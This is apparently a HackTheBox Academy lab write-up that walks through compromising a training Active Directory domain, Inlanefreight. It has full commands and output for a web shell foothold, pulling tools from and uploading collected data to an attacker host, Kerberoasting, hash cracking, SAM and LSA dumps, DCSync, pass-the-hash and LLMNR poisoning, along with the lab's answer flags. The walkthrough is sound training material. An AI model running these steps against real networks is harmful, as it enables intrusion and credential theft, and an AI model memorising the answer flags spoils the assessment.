
# Labs - Skills Assessment

## 

Part I[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#part-i)

A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

### 

1. Submit the contents of the flag.txt file on the administrator Desktop of the web server[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#1.-submit-the-contents-of-the-flag.txt-file-on-the-administrator-desktop-of-the-web-server)

Access Antak web shell at `http://10.129.139.169/uploads/antak.asp` using creds `admin:My_W3bsH3ll_P@ssw0rd!`

PS> whoami

nt authority\system

​

PS> dir C:\Users\Administrator\Desktop

​

Directory: C:\Users\Administrator\Desktop

​

Mode LastWriteTime Length Name

---- ------------- ------ ----

-a---- 4/11/2022 5:32 PM 21 flag.txt

​

PS> type C:\Users\Administrator\Desktop\flag.txt

JusT_g3tt1ng_st@rt3d!

**Answer:** `**JusT_g3tt1ng_st@rt3d!**`

### 

2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#2.-kerberoast-an-account-with-the-spn-mssqlsvc-sql01.inlanefreight.local-1433-and-submit-the-account)

Caught reverse shell through web shell for easier enumeration using PowerShell command from [https://www.revshells.com/](https://www.revshells.com/)​

PS C:\> systeminfo

Host Name: WEB-WIN01

OS Name: Microsoft Windows Server 2019 Datacenter

OS Version: 10.0.17763 N/A Build 17763

OS Manufacturer: Microsoft Corporation

OS Configuration: Member Server

OS Build Type: Multiprocessor Free

Registered Owner: Windows User

Registered Organization:

Product ID: 00430-10710-91142-AA408

Original Install Date: 3/30/2022, 1:27:04 AM

System Boot Time: 3/7/2023, 1:36:41 AM

System Manufacturer: VMware, Inc.

System Model: VMware7,1

System Type: x64-based PC

Processor(s): 2 Processor(s) Installed.

[01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz

[02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz

BIOS Version: VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020

Windows Directory: C:\Windows

System Directory: C:\Windows\system32

Boot Device: \Device\HarddiskVolume2

System Locale: en-us;English (United States)

Input Locale: en-us;English (United States)

Time Zone: (UTC-08:00) Pacific Time (US & Canada)

Total Physical Memory: 2,047 MB

Available Physical Memory: 1,275 MB

Virtual Memory: Max Size: 2,431 MB

Virtual Memory: Available: 1,663 MB

Virtual Memory: In Use: 768 MB

Page File Location(s): C:\pagefile.sys

Domain: INLANEFREIGHT.LOCAL

Logon Server: N/A

Hotfix(s): 2 Hotfix(s) Installed.

[01]: KB4578966

[02]: KB4464455

Network Card(s): 2 NIC(s) Installed.

[01]: vmxnet3 Ethernet Adapter

Connection Name: Ethernet0

DHCP Enabled: Yes

DHCP Server: 10.129.0.1

IP address(es)

[01]: 10.129.139.169

[02]: fe80::208f:25d9:3c7c:d424

[03]: dead:beef::208f:25d9:3c7c:d424

[04]: dead:beef::11

[02]: vmxnet3 Ethernet Adapter

Connection Name: Ethernet1

DHCP Enabled: No

IP address(es)

[01]: 172.16.6.100

[02]: fe80::f8c8:c134:4fe9:c4b0

Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed.

​

PS C:\> (New-Object Net.WebClient).DownloadFile('http://10.10.15.123:8000/PowerView.ps1','C:\PowerView.ps1')

PS C:\> dir

​

Directory: C:\

​

Mode LastWriteTime Length Name

---- ------------- ------ ----

d----- 3/30/2022 2:38 AM inetpub

d----- 9/15/2018 12:12 AM PerfLogs

d-r--- 4/11/2022 5:54 PM Program Files

d----- 3/30/2022 2:37 AM Program Files (x86)

d-r--- 4/11/2022 5:26 PM Users

d----- 4/11/2022 7:38 PM Windows

-a---- 3/7/2023 1:44 AM 770279 PowerView.ps1

​

PS C:\> import-module C:\PowerView.ps1

PS C:\> get-module

ModuleType Version Name ExportedCommands

---------- ------- ---- ----------------

Manifest 3.1.0.0 Microsoft.PowerShell.Management {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...

Manifest 3.1.0.0 Microsoft.PowerShell.Utility {Add-Member, Add-Type, Clear-Variable, Compare-Object...}

Script 0.0 PowerView

​

PS C:\> get-domain

Forest : INLANEFREIGHT.LOCAL

DomainControllers : {DC01.INLANEFREIGHT.LOCAL}

Children : {}

DomainMode : Unknown

DomainModeLevel : 7

Parent :

PdcRoleOwner : DC01.INLANEFREIGHT.LOCAL

RidRoleOwner : DC01.INLANEFREIGHT.LOCAL

InfrastructureRoleOwner : DC01.INLANEFREIGHT.LOCAL

Name : INLANEFREIGHT.LOCAL

​

PS C:\> get-domaincontroller

Forest : INLANEFREIGHT.LOCAL

CurrentTime : 3/7/2023 9:48:31 AM

HighestCommittedUsn : 65576

OSVersion : Windows Server 2019 Standard

Roles : {SchemaRole, NamingRole, PdcRole, RidRole...}

Domain : INLANEFREIGHT.LOCAL

IPAddress : 172.16.6.3

SiteName : Default-First-Site-Name

SyncFromAllServersCallback :

InboundConnections : {}

OutboundConnections : {}

Name : DC01.INLANEFREIGHT.LOCAL

Partitions : {DC=INLANEFREIGHT,DC=LOCAL, CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL,

CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL,

DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL...}

​

PS C:\> (New-Object Net.WebClient).DownloadFile('http://10.10.15.123:8000/Rubeus.exe','C:\Rubeus.exe')

PS C:\> .\Rubeus.exe kerberoast /nowrap

______ _

(_____ \ | |

_____) )_ _| |__ _____ _ _ ___

| __ /| | | | _ \| ___ | | | |/___)

| | \ \| |_| | |_) ) ____| |_| |___ |

|_| |_|____/|____/|_____)____/(___/

​

v2.0.2

​

[*] Action: Kerberoasting

​

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.

[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

​

[*] Target Domain : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

​

[*] Total kerberoastable users : 7

​

[*] SamAccountName : azureconnect

[*] DistinguishedName : CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

[*] ServicePrincipalName : adfsconnect/azure01.inlanefreight.local

[*] PwdLastSet : 3/30/2022 2:15:13 AM

[*] Supported ETypes : RC4_HMAC_DEFAULT

[*] Hash : <SNIP>

​

[*] SamAccountName : backupjob

[*] DistinguishedName : CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

[*] ServicePrincipalName : backupjob/veam001.inlanefreight.local

[*] PwdLastSet : 3/30/2022 2:15:17 AM

[*] Supported ETypes : RC4_HMAC_DEFAULT

[*] Hash : <SNIP>

​

[*] SamAccountName : sqltest

[*] DistinguishedName : CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

[*] ServicePrincipalName : MSSQLSvc/DEVTEST.inlanefreight.local:1433

[*] PwdLastSet : 3/30/2022 2:15:04 AM

[*] Supported ETypes : RC4_HMAC_DEFAULT

[*] Hash : <SNIP>

​

[*] SamAccountName : sqlqa

[*] DistinguishedName : CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

[*] ServicePrincipalName : MSSQLSvc/QA001.inlanefreight.local:1433

[*] PwdLastSet : 3/30/2022 2:15:09 AM

[*] Supported ETypes : RC4_HMAC_DEFAULT

[*] Hash : <SNIP>

​

[*] SamAccountName : sqldev

[*] DistinguishedName : CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

[*] ServicePrincipalName : MSSQLSvc/SQL-DEV01.inlanefreight.local:1433

[*] PwdLastSet : 3/30/2022 2:15:00 AM

[*] Supported ETypes : RC4_HMAC_DEFAULT

[*] Hash : <SNIP>

​

[*] SamAccountName : svc_sql

[*] DistinguishedName : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

[*] ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433

[*] PwdLastSet : 3/30/2022 2:14:52 AM

[*] Supported ETypes : RC4_HMAC_DEFAULT

[*] Hash : <SNIP>

​

[*] SamAccountName : sqlprod

[*] DistinguishedName : CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

[*] ServicePrincipalName : MSSQLSvc/SQL02.inlanefreight.local:1433

[*] PwdLastSet : 3/30/2022 2:14:56 AM

[*] Supported ETypes : RC4_HMAC_DEFAULT

[*] Hash : <SNIP>

​

PS C:\> (New-Object Net.WebClient).DownloadFile('http://10.10.15.123:8000/SharpHound.exe','C:\SharpHound.exe')

PS C:\> .\SharpHound.exe -c All --zipfilename INLANEFREIGHT

2023-03-07T01:55:30.1761195-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote

2023-03-07T01:55:30.1917471-08:00|INFORMATION|Initializing SharpHound at 1:55 AM on 3/7/2023

2023-03-07T01:55:30.4104919-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote

2023-03-07T01:55:30.5823958-08:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL

2023-03-07T01:56:00.7697876-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 49 MB RAM

2023-03-07T01:56:16.0197153-08:00|INFORMATION|Producer has finished, closing LDAP channel

2023-03-07T01:56:16.0197153-08:00|INFORMATION|LDAP channel closed, waiting for consumers

2023-03-07T01:56:16.2072173-08:00|INFORMATION|Consumers finished, closing output channel

2023-03-07T01:56:16.2540840-08:00|INFORMATION|Output channel closed, waiting for output task to complete

Closing writers

2023-03-07T01:56:16.7697094-08:00|INFORMATION|Status: 3626 objects finished (+3626 78.82609)/s -- Using 104 MB RAM

2023-03-07T01:56:16.7697094-08:00|INFORMATION|Enumeration finished in 00:00:46.1929398

2023-03-07T01:56:17.0353396-08:00|INFORMATION|SharpHound Enumeration Completed at 1:56 AM on 3/7/2023! Happy Graphing!

​

PS C:\> (New-Object Net.WebClient).DownloadFile('http://10.10.15.123:8000/PSUpload.ps1','C:\PSUpload.ps1')

PS C:\> import-module C:\PSUpload.ps1

PS C:\> Invoke-FileUpload -Uri http://10.10.15.123:8000/upload -File C:\*INLANEFREIGHT.zip

┌──(kali㉿kali)-[~]

└─$ python3 -m uploadserver

File upload available at /upload

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

10.129.139.169 - - [07/Mar/2023 04:59:16] [Uploaded] "20230307015614_INLANEFREIGHT.zip" --> /home/kali/20230307015614_INLANEFREIGHT.zip

10.129.139.169 - - [07/Mar/2023 04:59:16] "POST /upload HTTP/1.1" 204 -

Uploaded the .zip file generated by SharpHound into BloodHound GUI and also saved the hashes found from Kerberoasting into a file named `hashes` for password cracking. Account name with the SPN in the question is the answer below.

**Answer:** `**svc_sql**`

### 

3. Crack the account's password. Submit the cleartext value.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#3.-crack-the-accounts-password.-submit-the-cleartext-value.)

┌──(kali㉿kali)-[~]

└─$ hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$<SNIP>:lucky7

**Answer:** `**lucky7**`

### 

4. Submit the contents of the flag.txt file on the Administrator desktop on MS01[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#4.-submit-the-contents-of-the-flag.txt-file-on-the-administrator-desktop-on-ms01)

BloodHound GUI did not provide meaningful data :(

PS C:\> ping MS01

Pinging MS01.INLANEFREIGHT.LOCAL [172.16.6.50] with 32 bytes of data:

Reply from 172.16.6.50: bytes=32 time<1ms TTL=128

​

PS C:\windows\system32\inetsrv> $password = ConvertTo-SecureString "lucky7" -AsPlainText -Force

PS C:\windows\system32\inetsrv> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT.LOCAL\svc_sql", $password)

PS C:\windows\system32\inetsrv> Invoke-Command -computername MS01 -credential $cred -ScriptBlock{hostname; whoami; type C:\Users\Administrator\Desktop\flag.txt}

MS01

inlanefreight\svc_sql

spn$_r0ast1ng_on_@n_0p3n_f1re

MS01 can be accessed via RDP through proxychains too. First, configure Chisel on attack host and foothold, then:

┌──(kali㉿kali)-[~]

└─$ proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:'lucky7' /dynamic-resolution /drive:linux,/home/kali/Transfer

**Answer:** `**spn$_r0ast1ng_on_@n_0p3n_f1re**`

### 

5. Find cleartext credentials for another domain user. Submit the username as your answer.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#5.-find-cleartext-credentials-for-another-domain-user.-submit-the-username-as-your-answer.)

┌──(kali㉿kali)-[~]

└─$ proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p 'lucky7' --sam

SMB 172.16.6.50 445 MS01 [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)

SMB 172.16.6.50 445 MS01 [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)

SMB 172.16.6.50 445 MS01 [+] Dumping SAM hashes

SMB 172.16.6.50 445 MS01 Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::

SMB 172.16.6.50 445 MS01 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB 172.16.6.50 445 MS01 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB 172.16.6.50 445 MS01 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::

┌──(kali㉿kali)-[~]

└─$ proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p 'lucky7' --lsa

SMB 172.16.6.50 445 MS01 [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)

SMB 172.16.6.50 445 MS01 [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)

SMB 172.16.6.50 445 MS01 [+] Dumping LSA secrets

SMB 172.16.6.50 445 MS01 INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801

SMB 172.16.6.50 445 MS01 INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb

SMB 172.16.6.50 445 MS01 INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245

SMB 172.16.6.50 445 MS01 INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:7db543a4ca0140989b8d419224751037ff48efab33aa4a5e9c493a7cf66b4cba

SMB 172.16.6.50 445 MS01 INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:12d15fd0f478c6df1a349b7342af4508

SMB 172.16.6.50 445 MS01 INLANEFREIGHT\MS01$:des-cbc-md5:4c8f0bcb29616e86

SMB 172.16.6.50 445 MS01 INLANEFREIGHT\MS01$:plain_password_hex:d6f293d5f4afbc6bb199b763c2125e91a701f6de32be8f98187aa7ad428a21311270cc5506669e430937ec95c62c70abd12419c6839d0c4dfcde6a1d392fe76ca32deaef37d003b0b6e20c96c214fdc748cdb9ad73d26b444ecfb5e538401264cd09b0032f95a6a3e2dc8316259905953b13d44ba029a1e5a49f4a25e310c6a24a1abdcce08c355cae162091b66934b268b677b519e6df302d3da46d49e05e62bbda890a91f334a9b28bdc16a9a021cf8fabe011fd5745b759f2a0f9eb5b65cd1a46878fb16bbf9762dadfb640b1b3aa4e9dbf9ce465feddc860eca0d1abe397969ffa016d1bf6ddfe6fdb5eb0106bfd

SMB 172.16.6.50 445 MS01 INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:3056e8f757aa367ec5ba02110c64b89d:::

SMB 172.16.6.50 445 MS01 INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR

SMB 172.16.6.50 445 MS01 dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786

SMB 172.16.6.50 445 MS01 NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63

**Answer:** `**tpetty**`

### 

6. Submit this user's cleartext password.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#6.-submit-this-users-cleartext-password.)

Continued from above

**Answer:** `**Sup3rS3cur3D0m@inU2eR**`

### 

7. What attack can this user perform?[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#7.-what-attack-can-this-user-perform)

Queried user `tpetty` on BloodHound and found the following under First Degree Object Control (Outbound Object Control):

The user TPETTY@INLANEFREIGHT.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain INLANEFREIGHT.LOCAL.

​

These two privileges allow a principal to perform a DCSync attack.

**Answer:** `**DCSync**`

### 

8. Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#8.-take-over-the-domain-and-submit-the-contents-of-the-flag.txt-file-on-the-administrator-desktop-on)

┌──(kali㉿kali)-[~]

└─$ proxychains crackmapexec smb 172.16.6.3 -u tpetty -p 'Sup3rS3cur3D0m@inU2eR'

SMB 172.16.6.3 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

SMB 172.16.6.3 445 DC01 [+] INLANEFREIGHT.LOCAL\tpetty:Sup3rS3cur3D0m@inU2eR

​

┌──(kali㉿kali)-[~]

└─$ proxychains impacket-secretsdump INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::

[*] Kerberos keys grabbed

Administrator:aes256-cts-hmac-sha1-96:a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857

Administrator:aes128-cts-hmac-sha1-96:69e27df2550c5c270eca1d8ce5c46230

Administrator:des-cbc-md5:c2d9c892f2e6f2dc

[*] Cleaning up...

​

┌──(kali㉿kali)-[~]

└─$ proxychains evil-winrm -i 172.16.6.3 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname; whoami

DC01

inlanefreight\administrator

​

┌──(kali㉿kali)-[~]

└─$ proxychains impacket-psexec inlanefreight.local/administrator@172.16.6.3 -hashes :27dedb1dab4d8545c6e1c66fba077da0

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.6.3.....

[*] Found writable share ADMIN$

[*] Uploading file uogrcjoG.exe

[*] Opening SVCManager on 172.16.6.3.....

[*] Creating service MrRT on 172.16.6.3.....

[*] Starting service MrRT.....

[!] Press help for extra shell commands

​

Microsoft Windows [Version 10.0.17763.107]

(c) 2018 Microsoft Corporation. All rights reserved.

​

C:\Windows\system32> hostname

DC01

​

C:\Windows\system32> whoami

nt authority\system

​

C:\Windows\system32> dir C:\Users\Administrator\Desktop

Volume in drive C has no label.

Volume Serial Number is DA7F-3F25

​

Directory of C:\Users\Administrator\Desktop

​

04/11/2022 06:16 PM <DIR> .

04/11/2022 06:16 PM <DIR> ..

04/11/2022 06:17 PM 19 flag.txt

1 File(s) 19 bytes

2 Dir(s) 33,623,846,912 bytes free

​

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt

r3plicat1on_m@st3r!

**Answer:** `**r3plicat1on_m@st3r!**`

## 

Part II[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#part-ii)

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.

Info: SSH with user "htb-student" and password "HTB_@cademy_stdnt!"

### 

1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#1.-obtain-a-password-hash-for-a-domain-user-account-that-can-be-leveraged-to-gain-a-foothold-in-the)

┌──(kali㉿kali)-[~]

└─$ ssh htb-student@10.129.198.80

​

┌─[htb-student@skills-par01]─[~]

└──╼ $ip a

<SNIP>

3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000

link/ether 00:50:56:b9:26:fa brd ff:ff:ff:ff:ff:ff

altname enp19s0

inet 172.16.7.240/23 brd 172.16.7.255 scope global noprefixroute ens224

valid_lft forever preferred_lft forever

inet6 fe80::2957:2d31:5225:229a/64 scope link noprefixroute

valid_lft forever preferred_lft forever

┌─[htb-student@skills-par01]─[~]

└──╼ $fping -asgq 172.16.7.0/24

172.16.7.3

172.16.7.50

172.16.7.60

​

┌─[htb-student@skills-par01]─[~]

└──╼ $sudo nmap -iL hosts -F -sC -sV -Pn -T4

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-07 19:19 EST

Nmap scan report for inlanefreight.local (172.16.7.3)

Host is up (0.083s latency).

Not shown: 94 closed tcp ports (reset)

PORT STATE SERVICE VERSION

53/tcp open domain Simple DNS Plus

88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-08 00:19:28Z)

135/tcp open msrpc Microsoft Windows RPC

139/tcp open netbios-ssn Microsoft Windows netbios-ssn

389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)

445/tcp open microsoft-ds?

MAC Address: 00:50:56:B9:E4:A7 (VMware)

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

​

Host script results:

|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e4:a7 (VMware)

| smb2-time:

| date: 2023-03-08T00:19:29

|_ start_date: N/A

| smb2-security-mode:

| 3.1.1:

|_ Message signing enabled and required

​

Nmap scan report for 172.16.7.50

Host is up (0.089s latency).

Not shown: 96 closed tcp ports (reset)

PORT STATE SERVICE VERSION

135/tcp open msrpc Microsoft Windows RPC

139/tcp open netbios-ssn Microsoft Windows netbios-ssn

445/tcp open microsoft-ds?

3389/tcp open ms-wbt-server Microsoft Terminal Services

| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL

| Not valid before: 2023-03-06T23:51:20

|_Not valid after: 2023-09-05T23:51:20

|_ssl-date: 2023-03-08T00:19:36+00:00; 0s from scanner time.

| rdp-ntlm-info:

| Target_Name: INLANEFREIGHT

| NetBIOS_Domain_Name: INLANEFREIGHT

| NetBIOS_Computer_Name: MS01

| DNS_Domain_Name: INLANEFREIGHT.LOCAL

| DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL

| DNS_Tree_Name: INLANEFREIGHT.LOCAL

| Product_Version: 10.0.17763

|_ System_Time: 2023-03-08T00:19:28+00:00

MAC Address: 00:50:56:B9:F4:8A (VMware)

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

​

Host script results:

| smb2-time:

| date: 2023-03-08T00:19:28

|_ start_date: N/A

| smb2-security-mode:

| 3.1.1:

|_ Message signing enabled but not required

|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:f4:8a (VMware)

​

Nmap scan report for 172.16.7.60

Host is up (0.091s latency).

Not shown: 96 closed tcp ports (reset)

PORT STATE SERVICE VERSION

135/tcp open msrpc Microsoft Windows RPC

139/tcp open netbios-ssn Microsoft Windows netbios-ssn

445/tcp open microsoft-ds?

1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM

| ms-sql-ntlm-info:

| Target_Name: INLANEFREIGHT

| NetBIOS_Domain_Name: INLANEFREIGHT

| NetBIOS_Computer_Name: SQL01

| DNS_Domain_Name: INLANEFREIGHT.LOCAL

| DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL

| DNS_Tree_Name: INLANEFREIGHT.LOCAL

|_ Product_Version: 10.0.17763

|_ssl-date: 2023-03-08T00:19:36+00:00; 0s from scanner time.

| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback

| Not valid before: 2023-03-07T23:51:29

|_Not valid after: 2053-03-07T23:51:29

MAC Address: 00:50:56:B9:B5:B5 (VMware)

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

​

Host script results:

| ms-sql-info:

| Windows server name: SQL01

| 172.16.7.60\SQLEXPRESS:

| Instance name: SQLEXPRESS

| Version:

| name: Microsoft SQL Server 2019 RTM

| number: 15.00.2000.00

| Product: Microsoft SQL Server 2019

| Service pack level: RTM

| Post-SP patches applied: false

| TCP port: 1433

|_ Clustered: false

| smb2-security-mode:

| 3.1.1:

|_ Message signing enabled but not required

| smb2-time:

| date: 2023-03-08T00:19:29

|_ start_date: N/A

|_nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:b5:b5 (VMware)

​

Post-scan script results:

| clock-skew:

| 0s:

| 172.16.7.60

| 172.16.7.50

|_ 172.16.7.3 (inlanefreight.local)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 3 IP addresses (3 hosts up) scanned in 29.06 seconds

​

┌─[htb-student@skills-par01]─[~]

└──╼ $sudo responder -v -I ens224

__

.----.-----.-----.-----.-----.-----.--| |.-----.----.

| _| -__|__ --| _ | _ | | _ || -__| _|

|__| |_____|_____| __|_____|__|__|_____||_____|__|

|__|

​

NBT-NS, LLMNR & MDNS Responder 3.0.6.0

​

Author: Laurent Gaffie (laurent.gaffie@gmail.com)

To kill this script hit CTRL-C

<SNIP>

[*] [LLMNR] Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT

[*] [MDNS] Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT.LOCAL

[SMB] NTLMv2-SSP Client : 172.16.7.3

[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920

[SMB] NTLMv2-SSP Hash : AB920::INLANEFREIGHT:<SNIP>

**Answer:** `**AB920**`

### 

2. What is this user's cleartext password?[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#2.-what-is-this-users-cleartext-password)

┌─[htb-student@skills-par01]─[~]

└──╼ $hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

<SNIP>

AB920::INLANEFREIGHT:<SNIP>:weasal

**Answer:** `**weasal**`

### 

3. Submit the contents of the C:\flag.txt file on MS01.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#3.-submit-the-contents-of-the-c-flag.txt-file-on-ms01.)

┌─[htb-student@skills-par01]─[~]

└──╼ $evil-winrm -i 172.16.7.50 -u AB920 -p weasal

<SNIP>

*Evil-WinRM* PS C:\Users\AB920\Documents> hostname; whoami

MS01

inlanefreight\ab920

*Evil-WinRM* PS C:\Users\AB920\Documents> type C:\flag.txt

aud1t_gr0up_m3mbersh1ps!

**Answer:** `**aud1t_gr0up_m3mbersh1ps!**`

### 

